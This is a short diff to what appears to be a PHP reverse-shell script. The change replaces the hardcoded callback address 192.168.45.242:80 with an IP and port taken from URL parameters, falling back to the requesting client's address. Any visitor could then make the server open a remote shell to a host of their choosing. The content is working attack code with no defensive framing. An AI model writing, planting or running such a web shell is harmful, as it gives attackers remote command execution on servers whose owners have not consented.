@@ -173,11 +173,18 @@ class Shell {
     }
 }
 echo '<pre>';
+
+// Get IP and port from request parameters or default to the server's remote address and a default port
+$ip = isset($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR'];
+$port = isset($_GET['port']) ? $_GET['port'] : 80;
+
 // change the host address and/or port number as necessary
-$sh = new Shell('192.168.45.242', 80);
+$sh = new Shell($ip, $port);
 $sh->run();
 unset($sh);
+
 // garbage collector requires PHP v5.3.0 or greater
 // @gc_collect_cycles();
 echo '</pre>';
 ?>
+
